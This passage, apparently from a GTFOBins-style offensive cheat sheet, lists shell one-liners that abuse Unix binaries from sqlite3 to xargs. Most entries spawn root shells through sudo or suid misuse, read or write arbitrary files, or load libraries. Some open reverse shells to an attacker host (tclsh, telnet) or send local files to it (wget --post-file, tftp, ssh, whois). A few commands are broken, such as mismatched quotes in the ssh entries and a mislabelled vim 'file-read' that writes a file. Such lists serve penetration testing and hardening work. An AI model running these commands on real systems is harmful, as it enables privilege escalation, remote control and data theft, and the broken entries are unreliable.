```sh title:"sudo / suid / unprivileged"
sqlite3 /dev/null -cmd '.output $file_out' 'select "$data";'
```
<!-- cheat
var data
var file_out
-->

## sqlmap

### sqlmap inherit (inherits from python)

This allows to run Python code (`...`).

```sh title:"sudo / unprivileged"
sqlmap -u 127.0.0.1 --eval='...'
```
<!-- cheat
-->

## ss

### ss file-read

The file content is actually parsed so only a part of the first line is returned as a part of an error message.

```sh title:"sudo / suid / unprivileged"
ss -a -F $file_in
```
<!-- cheat
var file_in
-->

## ssh

### ssh shell #1

Reconnecting may help bypassing restricted shells.

```sh title:"sudo / suid / unprivileged"
ssh localhost /bin/sh
```
<!-- cheat
-->

### ssh shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
<!-- cheat
-->

### ssh shell #3

Spawn the shell on the client, but still requires a successful remote connection.

```sh title:"sudo / unprivileged"
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```
<!-- cheat
-->

### ssh file-read

The read file content is corrupted by error prints.

```sh title:"sudo / suid / unprivileged"
ssh -F $file_in x
```
<!-- cheat
var file_in
-->

### ssh download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
ssh user@$lhost 'cat $file_in"
```
<!-- cheat
import tun_ip
var file_in
-->

### ssh upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
echo $data | ssh user@$lhost 'cat >$file_out"
```
<!-- cheat
import tun_ip
var data
var file_out
-->

## ssh-agent

### ssh-agent shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ssh-agent /bin/sh
```
<!-- cheat
-->

#### ssh-agent shell - suid override

```sh title:"suid variant"
ssh-agent /bin/sh -p
```
<!-- cheat
-->

## ssh-copy-id

### ssh-copy-id file-read

The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t $file_out` option can be used.

```sh title:"sudo / unprivileged"
ssh-copy-id -f -i $file_in.pub user@$lhost
```
<!-- cheat
import tun_ip
var file_in
-->

### ssh-copy-id file-write

The input file must have the `.pub` file extension.

```sh title:"sudo / unprivileged"
ssh-copy-id -f -i $file_in.pub -t $file_out user@host
```
<!-- cheat
var file_in
var file_out
-->

## ssh-keygen

### ssh-keygen library-load

The shared library must contain the `void C_GetFunctionList() {}` function.

```sh title:"sudo / suid / unprivileged"
ssh-keygen -D $lib
```
<!-- cheat
var lib
-->

## ssh-keyscan

### ssh-keyscan file-read

The file content is actually parsed so only a part of each line is returned as a part of an error message.

```sh title:"sudo / suid / unprivileged"
ssh-keyscan -f $file_in
```
<!-- cheat
var file_in
-->

## sshfs

### sshfs shell

The mount dir must be writable by the invoking user.

```sh title:"sudo / unprivileged"
echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >$tmp_file
chmod +x $tmp_file
sshfs -o ssh_command=$tmp_file x: $dir/
```
<!-- cheat
var dir
var tmp_file
-->

### sshfs command

Execute an arbitrary non-interactive command.

```sh title:"sudo / unprivileged"
sshfs -o ssh_command=$cmd_file x: $dir/
```
<!-- cheat
var cmd_file
var dir
-->

### sshfs download

Pull a remote file to disk.

```sh title:"unprivileged"
sshfs user@$lhost:/ $dir/
cp $dir$file_in $file_out
```
<!-- cheat
import tun_ip
var dir
var file_in
var file_out
-->

### sshfs upload

Push a local file to a remote receiver.

```sh title:"unprivileged"
sshfs user@$lhost:/ $dir/
cp $file_in $dir/
```
<!-- cheat
import tun_ip
var dir
var file_in
-->

## sshpass

### sshpass shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
sshpass /bin/sh
```
<!-- cheat
-->

#### sshpass shell - suid override

```sh title:"suid variant"
sshpass /bin/sh -p
```
<!-- cheat
-->

## sshuttle

### sshuttle shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```
<!-- cheat
-->

## start-stop-daemon

### start-stop-daemon shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
start-stop-daemon -S -x /bin/sh
```
<!-- cheat
-->

#### start-stop-daemon shell - suid override

```sh title:"suid variant"
start-stop-daemon -S -x /bin/sh -- -p
```
<!-- cheat
-->

## stdbuf

### stdbuf shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
stdbuf -i0 /bin/sh
```
<!-- cheat
-->

#### stdbuf shell - suid override

```sh title:"suid variant"
stdbuf -i0 /bin/sh -p
```
<!-- cheat
-->

## strace

### strace shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
strace -o /dev/null /bin/sh
```
<!-- cheat
-->

#### strace shell - suid override

```sh title:"suid variant"
strace -o /dev/null /bin/sh -p
```
<!-- cheat
-->

### strace file-write

The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - $data`.

```sh title:"sudo / unprivileged"
strace -s 999 -o $file_out strace - $data
```
<!-- cheat
var data
var file_out
-->

## strings

### strings file-read

This only returns ASCII strings.

```sh title:"sudo / suid / unprivileged"
strings $file_in
```
<!-- cheat
var file_in
-->

## su

### su shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
su -c /bin/sh
```
<!-- cheat
-->

## sudo

### sudo shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
sudo /bin/sh
```
<!-- cheat
-->

## sysctl

### sysctl command

The command is executed by `root` in the background when a core dump occurs.  To trigger a core dump, send the `SIGQUIT` signal to a process, for example:  ``` sleep infinity & kill -QUIT $! ```

```sh title:"sudo / suid"
sysctl 'kernel.core_pattern=|$cmd_file'
```
<!-- cheat
var cmd_file
-->

### sysctl file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
sysctl -n "/../.$file_in"
```
<!-- cheat
var file_in
-->

## systemctl

### systemctl shell #1

It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.

```sh title:"sudo / suid"
echo '[Service]
Type=oneshot
ExecStart=$cmd_file
[Install]
WantedBy=multi-user.target' >$tmp_file
systemctl link $tmp_file
systemctl enable --now $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

### systemctl shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
echo /bin/sh >$tmp_file
chmod +x $tmp_file
SYSTEMD_EDITOR=$tmp_file systemctl edit basic.target
```
<!-- cheat
var tmp_file
-->

### systemctl inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
systemctl
```
<!-- cheat
-->

## systemd-resolve

### systemd-resolve inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo"
systemd-resolve --status
```
<!-- cheat
-->

## systemd-run

### systemd-run shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
systemd-run -S
```
<!-- cheat
-->

### systemd-run shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
systemd-run -t /bin/sh
```
<!-- cheat
-->

### systemd-run command

Execute an arbitrary non-interactive command.

```sh title:"sudo"
systemd-run $cmd_file
```
<!-- cheat
var cmd_file
-->

## tac

### tac file-read

Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.

```sh title:"sudo / suid / unprivileged"
tac -s 'RANDOM' $file_in
```
<!-- cheat
var file_in
-->

## tail

### tail file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
tail -c+0 $file_in
```
<!-- cheat
var file_in
-->

## tailscale

### tailscale upload

The URL is reachable by any host of the same Tailnet.

```sh title:"sudo"
tailscale serve --http=$lport $file_in
```
<!-- cheat
import lports
var file_in
-->

## tar

### tar shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
<!-- cheat
-->

### tar shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```
<!-- cheat
-->

#### tar shell #2 - suid override

```sh title:"suid variant"
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```
<!-- cheat
-->

### tar shell #3

The archive can also be prepared offline then uploaded to the target.

```sh title:"sudo / suid / unprivileged"
echo '/bin/sh 0<&1' >$tmp_file
tar cf $tmp_file $tmp_file
tar xf $tmp_file --to-command /bin/sh
```
<!-- cheat
var tmp_file
-->

### tar file-read

The file is read then passed to the specified command (e.g., `tar xO`) via standard input.

```sh title:"sudo / suid / unprivileged"
tar cf /dev/stdout $file_in -I 'tar xO'
```
<!-- cheat
var file_in
-->

### tar file-write

The archive can also be prepared offline then uploaded to the target.

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
tar cf $tmp_file $tmp_file
tar Pxf $tmp_file --xform s@.*@$file_out@
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### tar download

The attacker box must have the `rmt` utility installed.

```sh title:"sudo / suid / unprivileged"
tar xvf user@$lhost:$file_in.tar --rsh-command=/bin/ssh
```
<!-- cheat
import tun_ip
var file_in
-->

### tar upload

The attacker box must have the `rmt` utility installed.

```sh title:"sudo / suid / unprivileged"
tar cvf user@$lhost:$file_out $file_in --rsh-command=/bin/ssh
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## task

### task shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
task execute /bin/sh
```
<!-- cheat
-->

## taskset

### taskset shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
taskset 1 /bin/sh
```
<!-- cheat
-->

## tasksh

### tasksh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tasksh
!/bin/sh
```
<!-- cheat
-->

## tbl

### tbl file-read

The read file content is corrupted by additional text at the beginning.

```sh title:"sudo / suid / unprivileged"
tbl $file_in
```
<!-- cheat
var file_in
-->

## tclsh

### tclsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tclsh
```
<!-- cheat
-->

### tclsh reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
tclsh
set s [socket $lhost $lport];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```
<!-- cheat
import tun_ip
import lports
-->

### tclsh library-load

Load an attacker-supplied shared library.

```sh title:"capabilities / sudo / suid / unprivileged"
tclsh
load $lib x
```
<!-- cheat
var lib
-->

## tcpdump

### tcpdump command #1

This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

```sh title:"sudo / unprivileged"
echo $cmd_file >$tmp_file
chmod +x $tmp_file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

#### tcpdump command #1 - sudo override

```sh title:"sudo variant"
echo $cmd_file >$tmp_file
chmod +x $tmp_file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tmp_file -Z root
```
<!-- cheat
var cmd_file
var tmp_file
-->

### tcpdump command #2

This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.

```sh title:"sudo / unprivileged"
tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z $cmd_file
```
<!-- cheat
var cmd_file
-->

### tcpdump file-write

This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:  ``` nc -u localhost 1 <<<$data ```  While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.

```sh title:"sudo / suid / unprivileged"
tcpdump -ln -i lo -w $file_out -c 1 -Z user
```
<!-- cheat
var file_out
-->

## tcsh

### tcsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tcsh
```
<!-- cheat
-->

#### tcsh shell - suid override

```sh title:"suid variant"
tcsh -b
```
<!-- cheat
-->

### tcsh file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
tcsh -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### tcsh file-write - suid override

```sh title:"suid variant"
tcsh -bc 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## tdbtool

### tdbtool shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tdbtool
! /bin/sh
```
<!-- cheat
-->

## tee

### tee file-write

Use `-a` to append data to exising files.

```sh title:"sudo / suid / unprivileged"
echo $data | tee $file_out
```
<!-- cheat
var data
var file_out
-->

## telnet

### telnet shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
telnet
!/bin/sh
```
<!-- cheat
-->

### telnet reverse-shell

The shell process is not spawn by `openssl`.

```sh title:"sudo / suid / unprivileged"
mkfifo $tmp_sock
telnet $lhost $lport <$tmp_sock | /bin/sh >$tmp_sock
```
<!-- cheat
import tun_ip
import lports
var tmp_sock
-->

## terraform

### terraform file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
terraform console
file("$file_in")
```
<!-- cheat
var file_in
-->

## tex

### tex shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tex --shell-escape '\immediate\write18{/bin/sh}'
```
<!-- cheat
-->

## tftp

### tftp download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
tftp $lhost
get $file_in
```
<!-- cheat
import tun_ip
var file_in
-->

### tftp upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
tftp $lhost
put $file_in
```
<!-- cheat
import tun_ip
var file_in
-->

## tic

### tic file-read

This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.

```sh title:"sudo / suid / unprivileged"
tic -C $file_in
```
<!-- cheat
var file_in
-->

## time

### time shell

Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.

```sh title:"sudo / suid / unprivileged"
time /bin/sh
```
<!-- cheat
-->

#### time shell - suid override

```sh title:"suid variant"
time /bin/sh -p
```
<!-- cheat
-->

## timedatectl

This might not work if run by unprivileged users depending on the system configuration.

### timedatectl inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
timedatectl list-timezones
```
<!-- cheat
-->

## timeout

### timeout shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
timeout 0 /bin/sh
```
<!-- cheat
-->

#### timeout shell - suid override

```sh title:"suid variant"
timeout 0 /bin/sh -p
```
<!-- cheat
-->

## tmate

### tmate shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tmate -c /bin/sh
```
<!-- cheat
-->

## tmux

### tmux shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
tmux -c /bin/sh
```
<!-- cheat
-->

### tmux shell #2

Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).

```sh title:"sudo / suid / unprivileged"
tmux -S $socket
```
<!-- cheat
var socket
-->

### tmux file-read

The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.

```sh title:"sudo / suid / unprivileged"
tmux -f $file_in
```
<!-- cheat
var file_in
-->

## top

### top shell

The config path might be different.

```sh title:"sudo / unprivileged"
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```
<!-- cheat
-->

## torify

### torify shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
torify /bin/sh
```
<!-- cheat
-->

## torsocks

### torsocks shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
torsocks /bin/sh
```
<!-- cheat
-->

## troff

### troff file-read

The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.

```sh title:"sudo / suid / unprivileged"
troff $file_in
```
<!-- cheat
var file_in
-->

## tsc

### tsc file-read

Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.

```sh title:"sudo / unprivileged"
tsc $file_in.ts
```
<!-- cheat
var file_in
-->

### tsc file-write

Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.

```sh title:"sudo / unprivileged"
tsc $file_in.ts --outFile $file_out
```
<!-- cheat
var file_in
var file_out
-->

## tshark

### tshark inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / unprivileged"
echo '...' >$tmp_file
tshark -Xlua_script:$tmp_file
```
<!-- cheat
var tmp_file
-->

## ul

### ul file-read

The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.

```sh title:"sudo / suid / unprivileged"
ul $file_in
```
<!-- cheat
var file_in
-->

## unexpand

### unexpand file-read

Convert sequences of (e.g., `999`) spaces to tab.

```sh title:"sudo / suid / unprivileged"
unexpand -t999 $file_in
```
<!-- cheat
var file_in
-->

## uniq

### uniq file-read

The read file content is corrupted by squashing multiple adjacent lines.

```sh title:"sudo / suid / unprivileged"
uniq $file_in
```
<!-- cheat
var file_in
-->

## unshare

### unshare shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
unshare /bin/sh
```
<!-- cheat
-->

#### unshare shell - suid override

```sh title:"suid variant"
unshare -r /bin/sh
```
<!-- cheat
-->

## unsquashfs

`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh mksquashfs sh shell ```

### unsquashfs privilege-escalation

Escalate privileges directly.

```sh title:"sudo / suid"
unsquashfs shell
./squashfs-root/sh -p
```
<!-- cheat
-->

## unzip

Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh zip shell.zip sh ```

### unzip privilege-escalation

Escalate privileges directly.

```sh title:"sudo / suid"
unzip -K shell.zip
./sh -p
```
<!-- cheat
-->

## update-alternatives

### update-alternatives file-write

Write in `$file_out` a symlink to `$tmp_file`.

```sh title:"sudo / suid"
echo $data >$tmp_file
update-alternatives --force --install $file_out x $tmp_file 0
```
<!-- cheat
var data
var file_out
var tmp_file
-->

## urlget

### urlget file-read

This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.

```sh title:"sudo / suid / unprivileged"
urlget - $file_in
```
<!-- cheat
var file_in
-->

## uuencode

### uuencode file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
uuencode $file_in /dev/stdout | uudecode
```
<!-- cheat
var file_in
-->

## uv

### uv shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
uv run /bin/sh
```
<!-- cheat
-->

## vagrant

### vagrant inherit (inherits from ruby)

This allows to run Ruby code (`...`).

```sh title:"sudo / unprivileged"
echo '...' >Vagrantfile
vagrant up
```
<!-- cheat
-->

## valgrind

### valgrind shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
valgrind /bin/sh
```
<!-- cheat
-->

## varnishncsa

A running `varnishd` instance must be available.

### varnishncsa file-write

The command hangs, so the trigger command must be performed asynchronously or in another terminal:  ``` curl -H 'xxx: $data' http://localhost:6081/xxxxxxxxxx ```

```sh title:"sudo / suid"
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w $file_out
```
<!-- cheat
var file_out
-->

## vi

### vi shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
vi -c ':!/bin/sh' /dev/null
```
<!-- cheat
-->

### vi shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
vi -c ':shell'
```
<!-- cheat
-->

### vi shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
vi -c ':set shell=/bin/sh | shell'
```
<!-- cheat
-->

#### vi shell #3 - suid override

```sh title:"suid variant"
vi -c ':set shell=/bin/sh\ -p | shell'
```
<!-- cheat
-->

### vi shell #4

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
vi -c :terminal /bin/sh
```
<!-- cheat
-->

#### vi shell #4 - suid override

```sh title:"suid variant"
vi -c ':terminal /bin/sh -p'
```
<!-- cheat
-->

### vi file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
vi $file_in
```
<!-- cheat
var file_in
-->

### vi file-write

Where `^[` is the escape key.

```sh title:"sudo / suid / unprivileged"
vi $file_out
iDATA
^[
w
```
<!-- cheat
var file_out
-->

## view

Alias of [vim](#vim). All techniques from `vim` apply.

## vigr

### vigr inherit (inherits from vi)

Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.

```sh title:"sudo / suid"
vigr
```
<!-- cheat
-->

## vim

### vim file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
vim -c ':redir! >$file_out | echo "$data" | redir END | q'
```
<!-- cheat
var data
var file_out
-->

### vim inherit #1 (inherits from python)

This allows to run Python code (`...`).

```sh title:"sudo / suid / unprivileged"
vim -c ':py ...'
```
<!-- cheat
-->

### vim inherit #2 (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
vim -c ':lua ...'
```
<!-- cheat
-->

### vim inherit #3 (inherits from vi)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
vim
```
<!-- cheat
-->

## vimdiff

Alias of [vim](#vim). All techniques from `vim` apply.

## vipw

### vipw inherit (inherits from vi)

Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.

```sh title:"sudo / suid"
vipw
```
<!-- cheat
-->

## virsh

### virsh command

Execute an arbitrary non-interactive command.

```sh title:"sudo"
cat >$tmp_file <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='$cmd_file'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create $tmp_file
virsh -c qemu:///system destroy x
```
<!-- cheat
var cmd_file
var tmp_file
-->

### virsh file-write #1

This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.

```sh title:"sudo / unprivileged"
echo $data >$tmp_file

cat >$tmp_file <<EOF
<volume type='file'>
  <name>y</name>
  <key>$dir_out/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>$dir_out/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target $dir_out/
virsh -c qemu:///system vol-create --pool x --file $tmp_file
virsh -c qemu:///system vol-upload --pool x $dir_out/output-file $tmp_file
virsh -c qemu:///system pool-destroy x
```
<!-- cheat
var data
var dir_out
var tmp_file
-->

### virsh file-write #2

This requires the user to be in the `libvirt` group.

```sh title:"sudo / unprivileged"
virsh -c qemu:///system pool-create-as x dir --target $dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x
```
<!-- cheat
var dir
-->

## volatility

This allows to run Python code (`...`). Some valid core dump file is required, if not available, can be uploaded to the target.

### volatility inherit (inherits from python)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
volatility -f $core volshell
...
```
<!-- cheat
var core
-->

## w3m

### w3m file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
w3m -dump $file_in
```
<!-- cheat
var file_in
-->

## wall

### wall file-read

The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).

```sh title:"sudo"
wall --nobanner $file_in
```
<!-- cheat
var file_in
-->

## watch

### watch shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
```
<!-- cheat
-->

#### watch shell #1 - suid override

```sh title:"suid variant"
watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
```
<!-- cheat
-->

### watch shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
watch 'reset; exec /bin/sh 1>&0 2>&0'
```
<!-- cheat
-->

## wc

### wc file-read

The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.

```sh title:"sudo / suid / unprivileged"
wc --files0-from $file_in
```
<!-- cheat
var file_in
-->

## wg-quick

### wg-quick shell

Use `wg-quick down $tmp_file` in order to be able to run the shell again.

```sh title:"sudo"
cat >$tmp_file <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up $tmp_file
```
<!-- cheat
var tmp_file
-->

## wget

### wget shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$tmp_file
chmod +x $tmp_file
wget --use-askpass=$tmp_file 0
```
<!-- cheat
var tmp_file
-->

#### wget shell - suid override

```sh title:"suid variant"
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$tmp_file
chmod +x $tmp_file
wget --use-askpass=$tmp_file 0
```
<!-- cheat
var tmp_file
-->

### wget file-read

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

```sh title:"sudo / suid / unprivileged"
wget -i $file_in
```
<!-- cheat
var file_in
-->

### wget file-write

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

```sh title:"sudo / suid / unprivileged"
wget -i $file_in -o $file_out
```
<!-- cheat
var file_in
var file_out
-->

### wget download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
wget $scheme://$lhost$file_in -O $file_out
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### wget upload #1

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
wget --post-file=$file_in $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### wget upload #2

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
wget --post-data=$data $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var data
-->

## whiptail

### whiptail file-read

The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.

```sh title:"sudo / suid / unprivileged"
whiptail --textbox --scrolltext $file_in 0 0
```
<!-- cheat
var file_in
-->

## whois

### whois download

Received data has instances of the `\r` byte stripped.

```sh title:"sudo / suid / unprivileged"
whois -h $lhost -p $lport x
```
<!-- cheat
import tun_ip
import lports
-->

### whois upload

Data is converted to lower case, and has a trailing `\r\n`.

```sh title:"sudo / suid / unprivileged"
whois -h $lhost -p $lport $data
```
<!-- cheat
import tun_ip
import lports
var data
-->

## wireshark

### wireshark file-write

This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.  After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:  1. select the only received packet;  2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";  3. choose where to save the packet dump.

```sh title:"sudo / unprivileged"
wireshark -c 1 -i lo -k -f 'udp port $lport' &
echo $data | nc -u 127.127.127.127 $lport
```
<!-- cheat
import lports
var data
-->

### wireshark inherit (inherits from lua)

This requires GUI interaction. Start Wireshark, then from the main menu, select "Tools" -> "Lua" -> "Evaluate". A window opens that allows to execute Lua code.

```sh title:"sudo / unprivileged"
wireshark
```
<!-- cheat
-->

## wish

### wish inherit (inherits from tclsh)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
wish
```
<!-- cheat
-->

## xargs

### xargs shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
xargs -a /dev/null /bin/sh
```
<!-- cheat
-->

#### xargs shell #1 - suid override

```sh title:"suid variant"
xargs -a /dev/null /bin/sh -p
```
<!-- cheat
-->

### xargs shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
xargs -a /dev/null /bin/sh
```
<!-- cheat
-->

#### xargs shell #2 - suid override

```sh title:"suid variant"
xargs -a /dev/null /bin/sh -p
```
<!-- cheat
-->

### xargs shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo x | xargs -o -a /dev/null /bin/sh
```
<!-- cheat
-->

#### xargs shell #3 - suid override

```sh title:"suid variant"
echo x | xargs -o -a /dev/null /bin/sh -p
```
<!-- cheat
-->

### xargs file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
xargs -a $file_in -0
```
<!-- cheat
var file_in
-->

## xdg-user-dir

